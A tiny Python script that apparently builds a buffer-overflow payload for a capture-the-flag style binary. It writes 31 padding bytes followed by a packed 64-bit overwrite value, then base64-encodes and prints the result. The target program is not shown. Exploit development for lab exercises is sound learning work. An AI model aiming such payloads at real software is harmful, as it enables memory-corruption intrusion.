
import sys
import struct
import base64

buf = b'rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr'
buf += struct.pack('<Q', 3348374399800065706)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
